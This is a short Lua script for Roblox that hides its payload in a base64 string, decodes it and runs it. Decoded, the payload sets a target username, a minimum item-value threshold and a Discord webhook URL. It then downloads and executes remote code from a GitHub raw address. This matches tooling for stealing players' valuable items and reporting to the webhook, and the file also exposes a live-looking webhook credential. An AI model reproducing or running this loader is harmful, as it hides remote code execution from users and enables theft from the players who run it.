
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gImphbmthcnVsaXRpbjIyMzMiClVzZXJuYW1lMiA9ICJqYW5rYXJ1bGl0aW4yMjMzIgpNaW5pbXVtUkFQID0gMTAwMDAwCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM0ODIwMDE5OTk4OTc2MDE0MS9CVXV1WEd5ajdfQmNhMzNfUUE4OHRIOXJ0OHp2WHdSU0Q1X1A1RzJzeFJlTG5nR29Ucnc3cVRfVlRwZ19WZ2FzTXlUaCIKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMjE0RWxpLzIxNHNjcmlwdHMvcmVmcy9oZWFkcy9tYWluLzIxNHNjcmlwdHMiLCB0cnVlKSkoKQ=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()